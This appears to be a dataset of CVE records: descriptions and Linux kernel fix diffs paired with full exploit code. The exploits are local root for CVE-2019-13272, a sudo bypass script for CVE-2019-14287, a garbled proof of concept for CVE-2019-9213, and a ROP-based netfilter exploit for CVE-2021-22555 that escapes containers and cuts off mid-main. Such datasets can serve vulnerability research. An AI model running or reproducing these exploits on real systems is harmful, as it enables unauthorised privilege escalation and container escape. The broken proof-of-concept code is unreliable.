    useful_action = 0;

    /* extract the helper path */
    int length = strlen(line);
    char* found = memmem(&line[0], length, needle, needle_length);
    if (found == NULL)
      continue;

    memset(buffer, 0, sizeof(buffer));
    int i;
    for (i = 0; found[needle_length + i] != '\n'; i++) {
      if (i >= sizeof(buffer)-1)
        continue;
      buffer[i] = found[needle_length + i];
    }

    /* check helper path against helpers defined in 'blacklisted_helpers' array */
    blacklisted_helper = 0;
    for (i=0; i<sizeof(blacklisted_helpers)/sizeof(blacklisted_helpers[0]); i++) {
      if (strstr(&buffer[0], blacklisted_helpers[i]) != 0) {
        dprintf(""[.] Ignoring helper (blacklisted): %s\n"", &buffer[0]);
        blacklisted_helper = 1;
        break;
      }
    }
    if (blacklisted_helper == 1)
      continue;

    /* check the path exists */
    if (stat(&buffer[0], &st) != 0) {
      dprintf(""[.] Ignoring helper (does not exist): %s\n"", &buffer[0]);
      continue;
    }

    helpers[helper_index] = strndup(&buffer[0], strlen(buffer));
    helper_index++;

    if (helper_index >= sizeof(helpers)/sizeof(helpers[0]))
      break;
  }

  pclose(fp);
  return 0;
}
#endif

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *

int ptrace_traceme_root() {
  dprintf(""[.] Trying helper: %s\n"", helper_path);

  /*
   * set up a pipe such that the next write to it will block: packet mode,
   * limited to one packet
   */
  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
  char dummy = 0;
  SAFE(write(block_pipe[1], &dummy, 1));

  /* spawn pkexec in a child, and continue here once our child is in execve() */
  dprintf(""[.] Spawning suid process (%s) ...\n"", pkexec_path);
  static char middle_stack[1024*1024];
  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));
  if (!middle_success) return 1;

  /*
   * wait for our child to go through both execve() calls (first pkexec, then
   * the executable permitted by polkit policy).
   */
  while (1) {
    int fd = open(tprintf(""/proc/%d/comm"", midpid), O_RDONLY);
    char buf[16];
    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
    buf[buflen] = '\0';
    *strchrnul(buf, '\n') = '\0';
    if (strncmp(buf, basename(helper_path), 15) == 0)
      break;
    usleep(100000);
  }

  /*
   * our child should have gone through both the privileged execve() and the
   * following execve() here
   */
  dprintf(""[.] Tracing midpid ...\n"");
  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));
  SAFE(waitpid(midpid, &dummy_status, 0));
  dprintf(""[~] Attached to midpid\n"");

  force_exec_and_wait(midpid, 0, ""stage2"");
  exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
  if (strcmp(argv[0], ""stage2"") == 0)
    return middle_stage2();
  if (strcmp(argv[0], ""stage3"") == 0)
    return spawn_shell();

  dprintf(""Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n"");

  check_env();

  if (argc > 1 && strcmp(argv[1], ""check"") == 0) {
    exit(0);
  }

  int i;

#if ENABLE_AUTO_TARGETING
  /* search polkit policies for helper executables */
  dprintf(""[.] Searching policies for useful helpers ...\n"");
  find_helpers();
  for (i=0; i<sizeof(helpers)/sizeof(helpers[0]); i++) {
    if (helpers[i] == NULL)
      break;

    if (stat(helpers[i], &st) != 0)
      continue;

    helper_path = helpers[i];
    ptrace_traceme_root();
  }
#endif

#if ENABLE_FALLBACK_HELPERS
  /* search for known helpers defined in 'known_helpers' array */
  dprintf(""[.] Searching for known helpers ...\n"");
  for (i=0; i<sizeof(known_helpers)/sizeof(known_helpers[0]); i++) {
    if (stat(known_helpers[i], &st) != 0)
      continue;

    helper_path = known_helpers[i];
    dprintf(""[~] Found known helper: %s\n"", helper_path);
    ptrace_traceme_root();
  }
#endif

  dprintf(""[~] Done\n"");

  return 0;
}

",https://0x20h.com/p/fe4f.html,,,
CVE-2019-14287,https://www.opencve.io/cve/CVE-2019-14287,"In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a ""sudo -u \#$((0xffffffff))"" command.",,,"#!/bin/bash

# created by n0w4n
# script to check for CVE-2019-14287

# set var for exploitable version sudo
varSudoExploit='1,8,28'

sudo -l &>/dev/null

# check if current user has sudo ALL permission
sudo -l | \grep -e 'ALL.:.ALL' &>/dev/null
if [[ $? -eq 0 ]]
then
	echo -e '[-] This user has sudo ALL permission'
	echo -e '[-] You are basically root'
	echo -e '[-] Exiting'
else
	# if user has sudo rights, but no ALL permission
	sudo -l &>/dev/null
	if [[ $? -eq 1 ]]
	then
		echo -e 'This user has no sudo rights!'
	else
		# set var with program which user can use
		varSudo=$(sudo -l | \grep '(' | cut -d/ -f2-)
		echo -e '[-] This user has sudo rights'
		echo -e '[-] Checking sudo version'
		# set var with current sudo version to verify vulnerability
		varVersion=$(sudo --version | \grep -i 'sudo version' | awk '{print $3}' | sed 's/\./,/g' | cut -c -6)
		if ((  $varVersion < $varSudoExploit ))
		then
			echo -e '[-] This sudo version is vulnerable'
			echo -e '[-] Trying to exploit'
			sudo -u#-1 /$varSudo
		else
			echo -e '[-] This sudo version is not vulnerable'
			echo -e '[-] Exiting'
		fi
	fi
fi

",https://github.com/n0w4n/CVE-2019-14287/tree/master,,,
CVE-2019-9213,https://www.opencve.io/cve/CVE-2019-9213,"In the Linux kernel before 4.20.14, expand_downwards in mm/mmap.c lacks a check for the mmap minimum address, which makes it easier for attackers to exploit kernel NULL pointer dereferences on non-SMAP platforms. This is related to a capability check for the wrong task.","mm: enforce min addr even if capable() in expand_downwards()
security_mmap_addr() does a capability check with current_cred(), but
we can reach this code from contexts like a VFS write handler where
current_cred() must not be used.

This can be abused on systems without SMAP to make NULL pointer
dereferences exploitable again.

Fixes: 8869477a49c3 (""security: protect from stack expansion into low vm addresses"")
Cc: stable@kernel.org
Signed-off-by: Jann Horn <jannh@google.com>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
Diffstat
-rw-r--r--	mm/mmap.c	7	
1 files changed, 3 insertions, 4 deletions
diff --git a/mm/mmap.c b/mm/mmap.c
index f901065c4c64cf..fc1809b1bed67b 100644
--- a/mm/mmap.c
+++ b/mm/mmap.c
@@ -2426,12 +2426,11 @@ int expand_downwards(struct vm_area_struct *vma,
 {
 	struct mm_struct *mm = vma->vm_mm;
 	struct vm_area_struct *prev;
-	int error;
+	int error = 0;
 
 	address &= PAGE_MASK;
-	error = security_mmap_addr(address);
-	if (error)
-		return error;
+	if (address < mmap_min_addr)
+		return -EPERM;
 
 	/* Enforce stack_guard_gap */
 	prev = vma->vm_prev;",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0a1d52994d440e21def1c2174932410b4f2a98a1,"#include <stdio.h>
#include <sys/mman.h>
#include <err.h>
#include <fcntl.h>


int main() {
    //先获得一块此程序进程的允许的最低内存映射，添加MAP_GROWSDOWN FLAG以允许向低地址扩张
    unsigned long addr = (unsigned long)mmap((void *)0x10000,0x1000,PROT_READ|
    PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
    if (addr != 0x10000)
        err(2,""mmap failed"");

    //获得一个此进程mem文件的文件指针
    int fd = open(""/proc/self/mem"",O_RDWR);
    if (fd == -1)
        err(2,""open mem failed"");

    unsigned long addr = (unsigned long) map;
    while (addr)
    {
        addr -= 0x1000; // 页面是0x1000对齐的，每次递减，来获得0地址页面

        if (lseek(fd, addr, SEEK_SET) == -1)// 当将此文件的文件指针设置到addr地址
            err(2, ""lseek failed"");
        
        //调用su命令进行特权绕过，并使用LD_DEBUG生成一些数据进行写入，触发漏洞时，写入文件的addr为0
        sprintf(cmd, ""LD_DEBUG=help su 1>&%d"", fd);
        system(cmd);
    }
    //输出当前进程的内存映射，来证明映射到了0地址
    system(""head -n1 /proc/$PPID/maps"");

    //输出0地址中的内容
    printf(""contents:%s\n"",(char *)1);
}",https://yunlongs.cn/2021/07/20/CVE-2019-9213/,,,
CVE-2021-22555,https://www.opencve.io/cve/CVE-2021-22555,A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c. This allows an attacker to gain privileges or cause a DoS (via heap memory corruption) through user name space,"netfilter: x_tables: fix compat match/target pad out-of-bound write
xt_compat_match/target_from_user doesn't check that zeroing the area
to start of next rule won't write past end of allocated ruleset blob.

Remove this code and zero the entire blob beforehand.

Reported-by: syzbot+cfc0247ac173f597aaaa@syzkaller.appspotmail.com
Reported-by: Andy Nguyen <theflow@google.com>
Fixes: 9fa492cdc160c (""[NETFILTER]: x_tables: simplify compat API"")
Signed-off-by: Florian Westphal <fw@strlen.de>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
Diffstat (limited to 'net/netfilter/x_tables.c')
-rw-r--r--	net/netfilter/x_tables.c	10	
1 files changed, 2 insertions, 8 deletions
diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c
index 6bd31a7a27fc58..92e9d4ebc5e8d7 100644
--- a/net/netfilter/x_tables.c
+++ b/net/netfilter/x_tables.c
@@ -733,7 +733,7 @@ void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
 {
 	const struct xt_match *match = m->u.kernel.match;
 	struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;
-	int pad, off = xt_compat_match_offset(match);
+	int off = xt_compat_match_offset(match);
 	u_int16_t msize = cm->u.user.match_size;
 	char name[sizeof(m->u.user.name)];
 
@@ -743,9 +743,6 @@ void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
 		match->compat_from_user(m->data, cm->data);
 	else
 		memcpy(m->data, cm->data, msize - sizeof(*cm));
-	pad = XT_ALIGN(match->matchsize) - match->matchsize;
-	if (pad > 0)
-		memset(m->data + match->matchsize, 0, pad);
 
 	msize += off;
 	m->u.user.match_size = msize;
@@ -1116,7 +1113,7 @@ void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
 {
 	const struct xt_target *target = t->u.kernel.target;
 	struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
-	int pad, off = xt_compat_target_offset(target);
+	int off = xt_compat_target_offset(target);
 	u_int16_t tsize = ct->u.user.target_size;
 	char name[sizeof(t->u.user.name)];
 
@@ -1126,9 +1123,6 @@ void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
 		target->compat_from_user(t->data, ct->data);
 	else
 		memcpy(t->data, ct->data, tsize - sizeof(*ct));
-	pad = XT_ALIGN(target->targetsize) - target->targetsize;
-	if (pad > 0)
-		memset(t->data + target->targetsize, 0, pad);
 
 	tsize += off;
 	t->u.user.target_size = tsize;",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/netfilter/x_tables.c?id=b29c457a6511435960115c0f548c4360d5f4801d,"/*
 * CVE-2021-22555: Turning \x00\x00 into 10000$
 * by TUKRU
 *
 * tukru@tukru:~$ gcc -m32 -static -o exploit exploit.c
 * tukru@tukru:~$ ./exploit
 * [+] Linux Privilege Escalation by tukru@ - 2023
 *
 * [+] STAGE 0: Initialization
 * [*] Setting up namespace sandbox...
 * [*] Initializing sockets and message queues...
 *
 * [+] STAGE 1: Memory corruption
 * [*] Spraying primary messages...
 * [*] Spraying secondary messages...
 * [*] Creating holes in primary messages...
 * [*] Triggering out-of-bounds write...
 * [*] Searching for corrupted primary message...
 * [+] fake_idx: ffc
 * [+] real_idx: fc4
 *
 * [+] STAGE 2: SMAP bypass
 * [*] Freeing real secondary message...
 * [*] Spraying fake secondary messages...
 * [*] Leaking adjacent secondary message...
 * [+] kheap_addr: ffff91a49cb7f000
 * [*] Freeing fake secondary messages...
 * [*] Spraying fake secondary messages...
 * [*] Leaking primary message...
 * [+] kheap_addr: ffff91a49c7a0000
 *
 * [+] STAGE 3: KASLR bypass
 * [*] Freeing fake secondary messages...
 * [*] Spraying fake secondary messages...
 * [*] Freeing sk_buff data buffer...
 * [*] Spraying pipe_buffer objects...
 * [*] Leaking and freeing pipe_buffer object...
 * [+] anon_pipe_buf_ops: ffffffffa1e78380
 * [+] kbase_addr: ffffffffa0e00000
 *
 * [+] STAGE 4: Kernel code execution
 * [*] Spraying fake pipe_buffer objects...
 * [*] Releasing pipe_buffer objects...
 * [*] Checking for root...
 * [+] Root privileges gained.
 *
 * [+] STAGE 5: Post-exploitation
 * [*] Escaping container...
 * [*] Cleaning up...
 * [*] Popping root shell...
 * root@tukru:/# id
 * uid=0(root) gid=0(root) groups=0(root)
 * root@tukru:/#
 *
 * Exploit tested on Ubuntu 5.8.0-48-generic and COS 5.4.89+.
 */

// clang-format off
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>
// clang-format on

#define PAGE_SIZE 0x1000
#define PRIMARY_SIZE 0x1000
#define SECONDARY_SIZE 0x400

#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define NUM_PIPEFDS 256
#define NUM_MSQIDS 4096

#define HOLE_STEP 1024

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x1337

#define MSG_TAG 0xAAAAAAAA

// #define KERNEL_COS_5_4_89 1
#define KERNEL_UBUNTU_5_8_0_48 1

// clang-format off
#ifdef KERNEL_COS_5_4_89
// 0xffffffff810360f8 : push rax ; jmp qword ptr [rcx]
#define PUSH_RAX_JMP_QWORD_PTR_RCX 0x360F8
// 0xffffffff815401df : pop rsp ; pop rbx ; ret
#define POP_RSP_POP_RBX_RET 0x5401DF

// 0xffffffff816d3a65 : enter 0, 0 ; pop rbx ; pop r14 ; pop rbp ; ret
#define ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET 0x6D3A65
// 0xffffffff814ddfa8 : mov qword ptr [r14], rbx ; pop rbx ; pop r14 ; pop rbp ; ret
#define MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET 0x4DDFA8
// 0xffffffff81073972 : push qword ptr [rbp + 0x25] ; pop rbp ; ret
#define PUSH_QWORD_PTR_RBP_25_POP_RBP_RET 0x73972
// 0xffffffff8106748c : mov rsp, rbp ; pop rbp ; ret
#define MOV_RSP_RBP_POP_RBP_RET 0x6748C

// 0xffffffff810c7c80 : pop rdx ; ret
#define POP_RDX_RET 0xC7C80
// 0xffffffff8143a2b4 : pop rsi ; ret
#define POP_RSI_RET 0x43A2B4
// 0xffffffff81067520 : pop rdi ; ret
#define POP_RDI_RET 0x67520
// 0xffffffff8100054b : pop rbp ; ret
#define POP_RBP_RET 0x54B

// 0xffffffff812383a6 : mov rdi, rax ; jne 0xffffffff81238396 ; pop rbp ; ret
#define MOV_RDI_RAX_JNE_POP_RBP_RET 0x2383A6
// 0xffffffff815282e1 : cmp rdx, 1 ; jne 0xffffffff8152831d ; pop rbp ; ret
#define CMP_RDX_1_JNE_POP_RBP_RET 0x5282E1

#define FIND_TASK_BY_VPID 0x963C0
#define SWITCH_TASK_NAMESPACES 0x9D080
#define COMMIT_CREDS 0x9EC10
#define PREPARE_KERNEL_CRED 0x9F1F0

#define ANON_PIPE_BUF_OPS 0xE51600
#define INIT_NSPROXY 0x1250590
#elif KERNEL_UBUNTU_5_8_0_48
// 0xffffffff816e9783 : push rsi ; jmp qword ptr [rsi + 0x39]
#define PUSH_RSI_JMP_QWORD_PTR_RSI_39 0x6E9783
// 0xffffffff8109b6c0 : pop rsp ; ret
#define POP_RSP_RET 0x9B6C0
// 0xffffffff8106db59 : add rsp, 0xd0 ; ret
#define ADD_RSP_D0_RET 0x6DB59

// 0xffffffff811a21c3 : enter 0, 0 ; pop rbx ; pop r12 ; pop rbp ; ret
#define ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET 0x1A21C3
// 0xffffffff81084de3 : mov qword ptr [r12], rbx ; pop rbx ; pop r12 ; pop rbp ; ret
#define MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET 0x84DE3
// 0xffffffff816a98ff : push qword ptr [rbp + 0xa] ; pop rbp ; ret
#define PUSH_QWORD_PTR_RBP_A_POP_RBP_RET 0x6A98FF
// 0xffffffff810891bc : mov rsp, rbp ; pop rbp ; ret
#define MOV_RSP_RBP_POP_RBP_RET 0x891BC

// 0xffffffff810f5633 : pop rcx ; ret
#define POP_RCX_RET 0xF5633
// 0xffffffff811abaae : pop rsi ; ret
#define POP_RSI_RET 0x1ABAAE
// 0xffffffff81089250 : pop rdi ; ret
#define POP_RDI_RET 0x89250
// 0xffffffff810005ae : pop rbp ; ret
#define POP_RBP_RET 0x5AE

// 0xffffffff81557894 : mov rdi, rax ; jne 0xffffffff81557888 ; xor eax, eax ; ret
#define MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET 0x557894
// 0xffffffff810724db : cmp rcx, 4 ; jne 0xffffffff810724c0 ; pop rbp ; ret
#define CMP_RCX_4_JNE_POP_RBP_RET 0x724DB

#define FIND_TASK_BY_VPID 0xBFBC0
#define SWITCH_TASK_NAMESPACES 0xC7A50
#define COMMIT_CREDS 0xC8C80
#define PREPARE_KERNEL_CRED 0xC9110

#define ANON_PIPE_BUF_OPS 0x1078380
#define INIT_NSPROXY 0x1663080
#else
#error ""No kernel version defined""
#endif
// clang-format on

#define SKB_SHARED_INFO_SIZE 0x140
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))

struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

struct {
  long mtype;
  char mtext[PRIMARY_SIZE - MSG_MSG_SIZE];
} msg_primary;

struct {
  long mtype;
  char mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
} msg_secondary;

struct {
  long mtype;
  char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];
} msg_fake;

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = MTYPE_FAKE;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
    perror(""[-] msgsnd"");
    return -1;
  }
  return 0;
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) <
      0) {
    perror(""[-] msgrcv"");
    return -1;
  }
  return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
    perror(""[-] msgrcv"");
    return -1;
  }
  return 0;
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror(""[-] write"");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        perror(""[-] read"");
        return -1;
      }
    }
  }
  return 0;
}

int trigger_oob_write(int s) {
  struct __attribute__((__packed__)) {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                       sizeof(data.pad) + sizeof(data.target));

  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                            sizeof(data.pad) + sizeof(data.target));
  data.entry.target_offset =
      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
  strcpy(data.match.u.user.name, ""icmp"");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, ""NFQUEUE"");
  data.target.u.user.revision = 1;

  // Partially overwrite the adjacent buffer with 2 bytes of zero.
  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT) {
      printf(""[-] Error ip_tables module is not loaded.\n"");
      return -1;
    }
  }

  return 0;
}

// Note: Must not touch offset 0x10-0x18.
void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) {
  uint64_t *rop;
#ifdef KERNEL_COS_5_4_89
  *(uint64_t *)&buf[0x00] = kbase_addr + POP_RSP_POP_RBX_RET;

  rop = (uint64_t *)&buf[0x18];

  // Save RBP at scratchpad_addr.
  *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET;
  *rop++ = scratchpad_addr; // R14
  *rop++ = 0xDEADBEEF;      // RBP
  *rop++ = kbase_addr + MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBX
  *rop++ = 0xDEADBEEF; // R14
  *rop++ = 0xDEADBEEF; // RBP

  // commit_creds(prepare_kernel_cred(NULL))
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 0; // RDI
  *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
  *rop++ = kbase_addr + POP_RDX_RET;
  *rop++ = 1; // RDX
  *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + COMMIT_CREDS;

  // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 1; // RDI
  *rop++ = kbase_addr + FIND_TASK_BY_VPID;
  *rop++ = kbase_addr + POP_RDX_RET;
  *rop++ = 1; // RDX
  *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + POP_RSI_RET;
  *rop++ = kbase_addr + INIT_NSPROXY; // RSI
  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;

  // Load RBP from scratchpad_addr and resume execution.
  *rop++ = kbase_addr + POP_RBP_RET;
  *rop++ = scratchpad_addr - 0x25; // RBP
  *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_25_POP_RBP_RET;
  *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;
#elif KERNEL_UBUNTU_5_8_0_48
  *(uint64_t *)&buf[0x39] = kbase_addr + POP_RSP_RET;
  *(uint64_t *)&buf[0x00] = kbase_addr + ADD_RSP_D0_RET;

  rop = (uint64_t *)&buf[0xD8];

  // Save RBP at scratchpad_addr.
  *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;
  *rop++ = scratchpad_addr; // R12
  *rop++ = 0xDEADBEEF;      // RBP
  *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBX
  *rop++ = 0xDEADBEEF; // R12
  *rop++ = 0xDEADBEEF; // RBP

  // commit_creds(prepare_kernel_cred(NULL))
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 0; // RDI
  *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
  *rop++ = kbase_addr + POP_RCX_RET;
  *rop++ = 4; // RCX
  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
  *rop++ = kbase_addr + COMMIT_CREDS;

  // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 1; // RDI
  *rop++ = kbase_addr + FIND_TASK_BY_VPID;
  *rop++ = kbase_addr + POP_RCX_RET;
  *rop++ = 4; // RCX
  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
  *rop++ = kbase_addr + POP_RSI_RET;
  *rop++ = kbase_addr + INIT_NSPROXY; // RSI
  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;

  // Load RBP from scratchpad_addr and resume execution.
  *rop++ = kbase_addr + POP_RBP_RET;
  *rop++ = scratchpad_addr - 0xA; // RBP
  *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;
  *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;
#endif
}

int setup_sandbox(void) {
  if (unshare(CLONE_NEWUSER) < 0) {
    perror(""[-] unshare(CLONE_NEWUSER)"");
    return -1;
  }
  if (unshare(CLONE_NEWNET) < 0) {
    perror(""[-] unshare(CLONE_NEWNET)"");
    return -1;
  }

  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    perror(""[-] sched_setaffinity"");
    return -1;
  }

  return 0;
}

int main(int argc, char *argv[]) {
  int s;
  int fd;
  int ss[NUM_SOCKETS][2];
  int pipefd[NUM_PIPEFDS][2];
  int msqid[NUM_MSQIDS];

  char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];
  char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

  struct msg_msg *msg;
  struct pipe_buf_operations *ops;
  struct pipe_buffer *buf;

  uint64_t pipe_buffer_ops = 0;
  uint64_t kheap_addr = 0, kbase_addr = 0;

  int fake_idx = -1, real_idx = -1;

  printf(""[+] Linux Privilege Escalation by theflow@ - 2021\n"");

  printf(""\n"");
  printf(""[+] STAGE 0: Initialization\n"");

  printf(""[*] Setting up namespace sandbox...\n"");
  if (setup_sandbox() < 0)
    goto err_no_rmid;

  printf(""[*] Initializing sockets and message queues...\n"");

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror(""[-] socket"");
    goto err_no_rmid;
  }

  for (int i = 0; i < NUM_SOCKETS; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
      perror(""[-] socketpair"");
      goto err_no_rmid;
    }
  }

  for (int i = 0; i < NUM_MSQIDS; i++) {
    if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
      perror(""[-] msgget"");
      goto err_no_rmid;
    }
  }

  printf(""\n"");
  printf(""[+] STAGE 1: Memory corruption\n"");

  printf(""[*] Spraying primary messages...\n"");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_primary, 0, sizeof(msg_primary));
    *(int *)&msg_primary.mtext[0] = MSG_TAG;
    *(int *)&msg_primary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
        0)
      goto err_rmid;
  }

  printf(""[*] Spraying secondary messages...\n"");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_secondary, 0, sizeof(msg_secondary));
    *(int *)&msg_secondary.mtext[0] = MSG_TAG;
    *(int *)&msg_secondary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),
                  MTYPE_SECONDARY) < 0)
      goto err_rmid;
  }

  printf(""[*] Creating holes in primary messages...\n"");
  for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP) {
    if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
        0)
      goto err_rmid;
  }

  printf(""[*] Triggering out-of-bounds write...\n"");
  if (trigger_oob_write(s) < 0)
    goto err_rmid;

  printf(""[*] Searching for corrupted primary message...\n"");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    if (i != 0 && (i % HOLE_STEP) == 0)
      continue;
    if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)
      goto err_no_rmid;
    if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {
      printf(""[-] Error could not corrupt any primary message.\n"");
      goto err_no_rmid;
    }
    if (*(int *)&msg_secondary.mtext[4] != i) {
      fake_idx = i;
      real_idx = *(int *)&msg_secondary.mtext[4];
      break;
    }
  }

